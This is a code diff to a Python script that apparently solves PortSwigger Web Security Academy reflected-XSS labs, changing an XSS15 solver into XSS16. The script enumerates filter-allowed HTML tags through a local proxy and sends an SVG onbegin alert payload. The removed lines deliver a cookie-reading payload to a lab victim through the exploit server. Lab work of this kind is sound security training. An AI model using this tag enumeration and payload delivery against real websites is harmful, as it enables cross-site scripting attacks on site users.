@@ -10,14 +10,12 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 # author: 0xyf
 
 
-class XSS15:
+class XSS16:
     def __init__(self):
-        self.lab_id = "0a6f001c03d64cb6808d49e500e500de"
+        self.lab_id = "0a03009204d3cb5383e5413500b900b3"
         self.proxies = {"https": "http://127.0.0.1:8080"}
 
-        self.url = f"https://{self.lab_id}.web-security-academy.net"
-
-    ########### Enumerating suitable tags and attributes ###########
+        self.url = f"https://{self.lab_id}.h1-web-security-academy.net"
 
     def query_tag(self, tag):
         params = {"search": f"<{tag}>"}
@@ -29,7 +27,7 @@ class XSS15:
 
     def enum_tags(self):
         with open(
-            r"C:\Users\user\Documents\Labs\portswigger\xss\XSS15\tags.txt", "r"
+            r"C:\Users\user\Documents\Github\portswigger-labs\xss\XSS16\tags.txt", "r"
         ) as file:
             tags = [line.strip() for line in file.readlines()]
 
@@ -38,71 +36,33 @@ class XSS15:
                 x for x in executor.map(self.query_tag, tags) if x is not None
             ]
 
-        return self.found_tags
+        print(f"[*] found tags: {self.found_tags}")
 
-    def query_attr(self, attribute):
-        """
-        Iterates through self.found_tags, to see working attribute for each tag.
-        """
-        payloads = []
-
-        for tag in self.found_tags:
-            params = {"search": f"<{tag} {attribute}>"}
-            response = requests.get(
-                self.url, params=params, proxies=self.proxies, verify=False
-            )
-            if response.status_code == 200:
-                payloads.append(f"{tag} {attribute}")
-                self.payloads.append(f"{tag} {attribute}")
-        return payloads
-
-    def enum_attr(self):
-        with open(
-            r"C:\Users\user\Documents\Labs\portswigger\xss\XSS15\attributes.txt", "r"
-        ) as file:
-            attributes = [line.strip() for line in file.readlines()]
-
-        self.payloads = []
-        with ThreadPoolExecutor(max_workers=30) as executor:
-            executor.map(self.query_attr, attributes)
-
-        print(f"[*] self.payloads: {self.payloads}")
-
-        self.payload = [x for x in self.payloads if "a2 onfocus" == x][
+        self.svg_tag = [x for x in self.found_tags if "svg" in x][
             0
-        ]  # assume we pick <body resize> payload
+        ]  # assume we take svg payload
 
-        print(f"[*] payload: {self.payload}")
+        self.animate_tag = [x for x in self.found_tags if "animatetransform" in x][
+            0
+        ]  # assume we take animate payload
 
-    ########### Sending the exploit ###########
+    def execute_request(self, payload):
 
-    def get_exploit_srv_url(self):
-        r = requests.get(self.url)
-        soup = BeautifulSoup(r.text, "html.parser")
-        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")
+        params = {"search": payload}
 
-    def execute_request(self, data):
-        r = requests.post(
-            f"{self.exploit_srv_url}",
-            data=data,
+        r = requests.get(
+            f"{self.url}",
+            params=params,
             proxies=self.proxies,
             verify=False,
         )
+
         return r
 
     def reflected_xss(self):
-        self.get_exploit_srv_url()
-        payload = f'<{self.payload}="alert(document.cookie)" id=x tabindex=1></a>'
-        # payload = urllib.parse.quote(payload, safe="")
-        payload = f"""<script>location='{self.url}/?search={payload}#x'</script>"""
-        data = {
-            "urlIsHttps": "on",
-            "responseFile": "/exploit",
-            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
-            "formAction": "DELIVER_TO_VICTIM",
-            "responseBody": payload,
-        }
-        r = self.execute_request(data)
+        payload = f"<{self.svg_tag}><{self.animate_tag} onbegin=alert(1) attributeName=x dur=1s>"
+        print(f"[*] payload: {payload}")
+        r = self.execute_request(payload)
 
     def check_solved(self):
         sleep(2)
@@ -114,13 +74,12 @@ class XSS15:
 
     def solve(self):
         self.enum_tags()
-        self.enum_attr()
         self.reflected_xss()
         self.check_solved()
 
 
 def main():
-    XSS15().solve()
+    XSS16().solve()
 
 
 if __name__ == "__main__":
